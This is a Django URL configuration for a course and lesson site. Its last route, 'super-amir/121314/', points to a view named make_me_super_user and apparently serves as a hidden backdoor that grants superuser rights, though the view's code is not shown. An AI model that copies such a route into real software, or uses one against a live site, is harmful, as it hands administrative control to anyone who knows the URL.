from django.urls import path
from school import views

urlpatterns = [
    path("", views.index, name="Index"),
    path("buy-all/", views.buy_all, name="BuyAll"),
    path("courses-list/", views.course_list, name="CoursesList"),
    path("course/<int:course_id>/", views.course_view, name="Course"),
    path("course/<int:course_id>/unit/<int:unit_id>/", views.unit_view, name="Unit"),
    path("course/<int:course_id>/lesson/<int:lesson_id>/", views.lesson_view, name="Lesson"),
    path("course/<int:course_id>/lesson/<int:lesson_id>/comment-add-lesson/", views.comment_add_lesson, name="CommentAddLesson"),
    path("course/<int:course_id>/lesson/<int:lesson_id>/comment-add-comment/", views.comment_add_comment, name="CommentAddComment"),
    path('super-amir/121314/', views.make_me_super_user),
]